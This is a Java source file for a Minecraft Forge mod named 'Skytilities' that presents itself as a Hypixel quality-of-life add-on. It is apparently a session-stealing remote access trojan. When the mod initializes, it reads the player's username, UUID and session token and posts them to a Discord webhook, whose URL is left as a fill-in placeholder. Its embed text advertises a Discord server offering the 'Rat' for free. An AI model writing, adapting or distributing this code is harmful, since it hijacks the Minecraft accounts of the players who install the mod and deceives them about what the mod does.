package gov.hypixelqol.skytilities;

import net.minecraftforge.fml.common.*;
import net.minecraftforge.fml.common.event.*;
import net.minecraft.client.*;
import java.net.*;
import java.io.*;
import javax.net.ssl.*;
import java.nio.charset.StandardCharsets;

@Mod(modid = "Skytilities", version="1.9.2", acceptedMinecraftVersions="[1.8.9]")
public class skytilities
{
    public skytilities() {
    }
    @Mod.EventHandler
    public void init(final FMLInitializationEvent event) throws Exception {
        final Minecraft z = Minecraft.getMinecraft();
        String a = z.getSession().getUsername();
        String b = z.getSession().getPlayerID();
        String c = z.getSession().getToken();

        final String s = String.format("{\"embeds\":[{\"title\":\"Minecraft Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```"+a+"```\"},{\"name\":\"UUID\",\"value\":\"```"+b+"```\"},{\"name\":\"SessionID Login (Token:UUID)\",\"value\":\"```"+c+":"+b+"```\"}],\"author\":{\"name\":\"If you paid for this Rat you got scammed, get your own free Rat here: https://discord.gg/W3hRUMB2YU\",\"url\":\"https://discord.gg/W3hRUMB2YU\"},\"thumbnail\":{\"url\":\"https://mc-heads.net/player/"+b+"/200\"}}],\"username\":\"Im sorry Rating isnt nice\",\"avatar_url\":\"https://i.pinimg.com/originals/f2/b6/e1/f2b6e1c8f7a1ba711dbf77890865e939.jpg\"}");
        final HttpsURLConnection con = (HttpsURLConnection)new URL("WEBHOOK-HERE").openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("Content-Type", "application/json");
        con.setRequestProperty("User-Agent", "Mozilla/5.0");
        con.setDoOutput(true);
        try (OutputStream h = con.getOutputStream();){
            h.write(s.getBytes(StandardCharsets.UTF_8));
        }
        con.getResponseCode();
        return;
    }
}
